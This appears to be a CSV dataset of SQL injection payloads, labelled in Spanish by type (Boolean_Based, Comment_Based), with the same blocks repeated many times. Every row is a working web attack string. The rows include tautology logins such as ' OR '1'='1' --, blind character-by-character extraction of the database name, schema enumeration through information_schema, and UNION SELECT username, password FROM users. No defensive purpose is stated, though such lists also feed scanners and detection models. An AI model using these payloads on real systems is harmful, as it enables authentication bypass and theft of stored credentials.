Payload,Tipo
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' AND '1'='1,Boolean_Based
' AND '1'='2,Boolean_Based
' OR '1'='1,Boolean_Based
' OR '1'='2,Boolean_Based
' AND 1=1,Boolean_Based
' AND 1=2,Boolean_Based
' OR 1=1,Boolean_Based
' OR 1=2,Boolean_Based
' AND (SELECT COUNT(*) FROM users)>0,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,Boolean_Based
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",Boolean_Based
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",Boolean_Based
' AND (SELECT 1 FROM dual) IS NOT NULL,Boolean_Based
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),Boolean_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
